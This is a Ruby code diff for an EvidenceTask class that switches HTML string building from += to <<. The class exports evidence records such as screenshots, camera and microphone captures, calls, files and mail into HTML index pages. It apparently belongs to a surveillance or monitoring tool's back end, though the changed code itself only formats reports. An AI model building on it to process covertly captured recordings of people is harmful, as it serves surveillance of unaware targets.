@@ -122,26 +122,26 @@ class EvidenceTask
       next if ['_grid', '_grid_size', 'md5', 'type', 'body', 'status'].include? k
       v = CGI::escapeHTML(v.to_s)
       v.gsub! /\n/, '<br>' if v.class == String
-      table += "<tr><td class=\"inner\">#{k}</td><td class=\"inner\">#{v}</td></tr>"
+      table << "<tr><td class=\"inner\">#{k}</td><td class=\"inner\">#{v}</td></tr>"
     end
     # add binary content
     case row[:type]
       when 'screenshot', 'camera', 'print'
-        table += "<tr><td class=\"inner\">image</td><td class=\"inner\">#{html_image(row[:data]['_grid'].to_s + '.jpg')}</td></tr>"
+        table << "<tr><td class=\"inner\">image</td><td class=\"inner\">#{html_image(row[:data]['_grid'].to_s + '.jpg')}</td></tr>"
       when 'mouse'
-        table += "<tr><td class=\"inner\">image</td><td class=\"inner\">#{html_image(row[:data]['_grid'].to_s + '.jpg', 40)}</td></tr>"
+        table << "<tr><td class=\"inner\">image</td><td class=\"inner\">#{html_image(row[:data]['_grid'].to_s + '.jpg', 40)}</td></tr>"
       when 'call', 'mic'
-        table += "<tr><td class=\"inner\">audio</td><td class=\"inner\">#{html_mp3_player(row[:data]['_grid'].to_s + '.mp3')}</td></tr>"
+        table << "<tr><td class=\"inner\">audio</td><td class=\"inner\">#{html_mp3_player(row[:data]['_grid'].to_s + '.mp3')}</td></tr>"
       when 'file'
         if row[:data]['type'] == 'capture'
-          table += "<tr><td class=\"inner\">file</td><td class=\"inner\"><a href=\"#{row[:data]['_grid'].to_s + File.extname(row[:data]['path'])}\" title=\"Download\"><font size=3><b>⇊</b></font></a></td></tr>"
+          table << "<tr><td class=\"inner\">file</td><td class=\"inner\"><a href=\"#{row[:data]['_grid'].to_s + File.extname(row[:data]['path'])}\" title=\"Download\"><font size=3><b>⇊</b></font></a></td></tr>"
         end
       when 'message'
         if row[:data]['type'] == 'mail'
-          table += "<tr><td class=\"inner\">body</td><td class=\"inner\"><a href=\"#{row[:data]['_grid'].to_s + '.txt'}\" title=\"Download\"><font size=3><b>⇊</b></font></a></td></tr>"
+          table << "<tr><td class=\"inner\">body</td><td class=\"inner\"><a href=\"#{row[:data]['_grid'].to_s + '.txt'}\" title=\"Download\"><font size=3><b>⇊</b></font></a></td></tr>"
         end
       end
-    table += "</tbody></table>"
+    table << "</tbody></table>"
     table
   end
 
@@ -150,12 +150,12 @@ class EvidenceTask
     table = "<table class=\"stat\"><tbody><tr>"
     data.each_with_index do |value|
       h = value * 20 / max
-      table += "<td class=\"stat\"><img src=\"style/stat.png\" height=\"#{h}\" width=\"6\"></td>"
+      table << "<td class=\"stat\"><img src=\"style/stat.png\" height=\"#{h}\" width=\"6\"></td>"
     end
-    table += "</tr><tr>"
+    table << "</tr><tr>"
     # put the hours
-    (0..23).each {|h| table += "<td  class=\"stat\">#{'%02d' % h}</td>"}
-    table += "</tr></tbody></table>"
+    (0..23).each {|h| table << "<td  class=\"stat\">#{'%02d' % h}</td>"}
+    table << "</tr></tbody></table>"
     table
   end
 
@@ -178,14 +178,14 @@ class EvidenceTask
     out = {}
     out[:name] = File.join(day, 'index.html')
     out[:content] = html_page_header
-    out[:content] += html_evidence_table_header day
+    out[:content] << html_evidence_table_header(day)
 
     return out
   end
 
   def end_file(out)
-    out[:content] += html_table_footer
-    out[:content] += html_page_footer
+    out[:content] << html_table_footer
+    out[:content] << html_page_footer
   end
 
   def dump_file(day, evidence, target)
@@ -193,14 +193,14 @@ class EvidenceTask
     name = evidence[:data]['_grid'].to_s
     case evidence[:type]
       when 'screenshot', 'camera', 'mouse', 'print'
-        name += '.jpg'
+        name << '.jpg'
       when 'call', 'mic'
-        name += '.mp3'
+        name << '.mp3'
       when 'file'
-        name += File.extname evidence[:data]['path']
+        name << File.extname(evidence[:data]['path'])
       when 'message'
         if evidence[:data]['type'] == 'mail'
-          name += '.txt'
+          name << '.txt'
         end
     end
     return File.join(day, name), file.read
@@ -210,14 +210,14 @@ class EvidenceTask
     out = {}
     out[:name] = 'index.html'
     out[:content] = html_page_header
-    out[:content] += html_summary_table_header
+    out[:content] << html_summary_table_header
 
     summary.each_pair do |k,v|
-      out[:content] += html_summary_table_row date: k, num: v
+      out[:content] << html_summary_table_row(date: k, num: v)
     end
 
-    out[:content] += html_table_footer
-    out[:content] += html_page_footer
+    out[:content] << html_table_footer
+    out[:content] << html_page_footer
 
     return out
   end
@@ -281,7 +281,7 @@ class EvidenceTask
       end
 
       # write the current evidence
-      out[:content] += html_evidence_table_row e
+      out[:content] << html_evidence_table_row(e)
 
       # export the binary file
       if e[:data]['_grid']
